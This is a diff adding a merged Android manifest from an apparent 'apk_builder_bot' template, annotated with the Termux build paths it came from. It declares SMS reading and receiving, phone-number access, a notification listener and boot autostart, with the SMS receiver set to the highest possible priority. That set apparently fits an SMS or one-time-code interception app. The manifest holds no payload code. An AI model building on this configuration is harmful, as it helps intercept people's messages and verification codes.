@@ -1,0 +1,157 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.template.app"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="21"
+8-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml
+9        android:targetSdkVersion="33" />
+9-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml
+10
+11    <!-- Разрешения -->
+12    <uses-permission android:name="android.permission.INTERNET" />
+12-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:6:5-67
+12-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:6:22-64
+13    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+13-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:7:5-75
+13-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:7:22-72
+14    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+14-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:8:5-77
+14-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:8:22-74
+15    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+15-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:9:5-70
+15-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:9:22-67
+16    <uses-permission android:name="android.permission.READ_SMS" />
+16-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:10:5-67
+16-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:10:22-64
+17    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+17-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:11:5-81
+17-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:11:22-78
+18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+18-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:12:5-77
+18-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:12:22-74
+19    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+19-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:13:5-93
+19-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:13:22-90
+20    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+20-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:14:5-77
+20-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:14:22-74
+21    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+21-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:15:5-79
+21-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:15:22-76
+22    <uses-permission android:name="android.permission.WAKE_LOCK" />
+22-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:16:5-68
+22-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:16:22-65
+23
+24    <application
+24-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:18:5-76:19
+25        android:allowBackup="true"
+25-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:19:9-35
+26        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+26-->[androidx.core:core:1.5.0] /data/data/com.termux/files/home/.gradle/caches/transforms-3/d607dba28ebe7b5b7dd80e97c3b5ab68/transformed/core-1.5.0/AndroidManifest.xml:24:18-86
+27        android:icon="@mipmap/ic_launcher"
+27-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:20:9-43
+28        android:label="APP_NAME_PLACEHOLDER"
+28-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:21:9-45
+29        android:networkSecurityConfig="@xml/network_security_config"
+29-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:26:9-69
+30        android:roundIcon="@mipmap/ic_launcher_round"
+30-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:22:9-54
+31        android:supportsRtl="true"
+31-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:23:9-35
+32        android:theme="@style/AppTheme"
+32-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:24:9-40
+33        android:usesCleartextTraffic="true" >
+33-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:25:9-44
+34
+35        <!-- Главная Activity -->
+36        <activity
+36-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:29:9-37:20
+37            android:name="com.template.app.MainActivity"
+37-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:30:13-41
+38            android:configChanges="orientation|screenSize"
+38-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:32:13-59
+39            android:exported="true" >
+39-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:31:13-36
+40            <intent-filter>
+40-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:33:13-36:29
+41                <action android:name="android.intent.action.MAIN" />
+41-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:34:17-69
+41-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:34:25-66
+42
+43                <category android:name="android.intent.category.LAUNCHER" />
+43-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:35:17-77
+43-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:35:27-74
+44            </intent-filter>
+45        </activity>
+46
+47        <!-- SMS сервис -->
+48        <service
+48-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:40:9-43:38
+49            android:name="com.template.app.SmsReceiverService"
+49-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:41:13-47
+50            android:enabled="true"
+50-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:43:13-35
+51            android:exported="false" />
+51-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:42:13-37
+52
+53        <!-- Уведомления listener -->
+54        <service
+54-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:46:9-53:19
+55            android:name="com.template.app.NotificationService"
+55-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:47:13-48
+56            android:exported="true"
+56-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:48:13-36
+57            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
+57-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:49:13-87
+58            <intent-filter>
+58-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:50:13-52:29
+59                <action android:name="android.service.notification.NotificationListenerService" />
+59-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:51:17-99
+59-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:51:25-96
+60            </intent-filter>
+61        </service>
+62
+63        <!-- Автозапуск после перезагрузки -->
+64        <receiver
+64-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:56:9-64:20
+65            android:name="com.template.app.BootReceiver"
+65-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:57:13-41
+66            android:enabled="true"
+66-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:59:13-35
+67            android:exported="true" >
+67-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:58:13-36
+68            <intent-filter android:priority="1000" >
+68-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:60:13-63:29
+68-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:60:28-51
+69                <action android:name="android.intent.action.BOOT_COMPLETED" />
+69-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:61:17-79
+69-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:61:25-76
+70                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+70-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:62:17-82
+70-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:62:25-79
+71            </intent-filter>
+72        </receiver>
+73
+74        <!-- SMS BroadcastReceiver -->
+75        <receiver
+75-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:67:9-74:20
+76            android:name="com.template.app.SmsReceiver"
+76-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:68:13-40
+77            android:exported="true"
+77-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:69:13-36
+78            android:permission="android.permission.BROADCAST_SMS" >
+78-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:70:13-66
+79            <intent-filter android:priority="2147483647" >
+79-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:71:13-73:29
+79-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:71:28-57
+80                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+80-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:72:17-82
+80-->/data/data/com.termux/files/home/apk_builder_bot/apk_template/app/src/main/AndroidManifest.xml:72:25-79
+81            </intent-filter>
+82        </receiver>
+83    </application>
+84
+85</manifest>
